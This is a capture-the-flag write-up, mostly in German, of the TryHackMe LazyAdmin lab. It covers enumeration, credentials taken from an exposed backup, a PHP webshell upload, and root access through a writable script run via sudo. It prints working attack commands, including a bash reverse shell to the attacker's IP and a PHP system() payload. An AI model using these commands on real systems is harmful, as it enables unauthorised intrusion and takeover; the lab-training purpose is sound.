# LazyAdmin — TryHackMe Writeup

**Platform:** TryHackMe
**Difficulty:** Easy
**Target:** 10.112.174.3

---

## 1. Recon

```bash
nmap -sC -sV -p- 10.112.174.3
```

**Findings:**
- Port 80 open → HTTP Webserver

---

## 2. Enumeration

```bash
gobuster dir -u http://10.112.174.3 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

Found: `/content/`

```bash
gobuster dir -u http://10.112.174.3/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

Found: `/content/inc/mysql_backup/`

---

## 3. Initial Access

Backup file enthielt Credentials:

```
User:     manager
Password: Password123
```

Admin-Panel unter:

```
http://10.112.174.3/content/as/
```

Login erfolgreich.

---

## 4. Code Execution

Upload-Funktion im Media Center verfügbar. PHP-Execution getestet:

```php
<?php system("id"); ?>
```

Output: `www-data` → RCE bestätigt.

---

## 5. Reverse Shell

Listener starten:

```bash
nc -lvnp 4444
```

Shell getriggert → Zugriff als `www-data`.

---

## 6. User Flag

```bash
find / -name user.txt 2>/dev/null
```

Flag unter: `/home/itguy/user.txt`

---

## 7. Privilege Escalation — Enumeration

```bash
sudo -l
```

Output:

```
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

---

## 8. Exploit-Pfad analysieren

```bash
cat /home/itguy/backup.pl
```

Inhalt:

```perl
system("sh", "/etc/copy.sh");
```

```bash
ls -l /etc/copy.sh
```

`/etc/copy.sh` ist schreibbar durch `www-data`.

---

## 9. Privilege Escalation

Script überschreiben:

```bash
echo 'bash -c "bash -i >& /dev/tcp/10.112.120.82/4444 0>&1"' > /etc/copy.sh
```

Listener starten:

```bash
nc -lvnp 4444
```

Als root ausführen:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

→ Root Shell erhalten.

---

## 10. Root Flag

```bash
cat /root/root.txt
```

---

## Lessons Learned

- Backup-Dateien können Credentials leaken → immer auf `/backup/`, `/inc/`, `/db/` prüfen
- Schwache Upload-Restrictions ermöglichen RCE über PHP-Webshells
- Beschreibbare Scripts, die via `sudo` ausgeführt werden, sind direkte Eskalationspfade
- `sudo -l` frühzeitig prüfen
